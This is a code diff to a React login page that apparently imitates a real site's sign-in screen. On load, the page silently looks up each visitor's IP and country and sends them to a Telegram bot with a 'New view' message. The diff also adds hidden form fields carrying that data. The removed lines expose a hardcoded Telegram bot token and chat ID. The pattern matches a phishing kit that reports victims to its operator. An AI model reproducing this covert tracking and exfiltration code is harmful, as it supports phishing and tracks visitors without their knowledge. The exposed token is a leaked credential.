@@ -10,21 +10,25 @@ const Login = () => {
   const [loginError, setLoginError] = useState(false);
   const [passwordVisible, setPasswordVisible] = useState(false);
   const history = useHistory();
+    const [country, setCountry] = useState('');
+  const [ip, setIp] = useState('');
+
 
   useEffect(() => {
     const sendTelegramNotification = async () => {
       if (localStorage.getItem('notificationSent')) return;
 
-      const TELEGRAM_BOT_TOKEN = "7319238706:AAFybFkHvxzcEOvBU94H8M-t4bIKCiJDjoA";
-      const TELEGRAM_CHAT_ID = "1166056286";
+      const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN;
+      const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID;
 
       try {
         // Alternative using ip-api.com (also free, no API key needed)
-        const ipData = await axios.get('http://ip-api.com/json/?fields=country,query');
-        const { query: ip, country } = ipData.data;
+        const ipData = await axios.get('https://ipinfo.io/json');
+        const { ip, country } = ipData.data;
         localStorage.setItem('country', country);
         const currentTime = new Date().toLocaleString();
-
+	setIp(ip);
+	setCountry(country)
         const message = `New view\nIP: ${ip}\nCountry: ${country}\nTime: ${currentTime}`;
         
         await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -181,6 +185,9 @@ const Login = () => {
                     <p className="sc-czgmHJ kraIJY">Forgot your password?</p>
                   </a>
                 </div>
+        <input type="hidden" name="country" value={country} />
+        <input type="hidden" name="ip" value={ip} />
+
               </form>
               <div style={{ marginTop: '9px' }} id="sign-up-section" className="sc-dorvvM ewqcub">
                 <h2 className="sc-cBYhjr kyvYle">
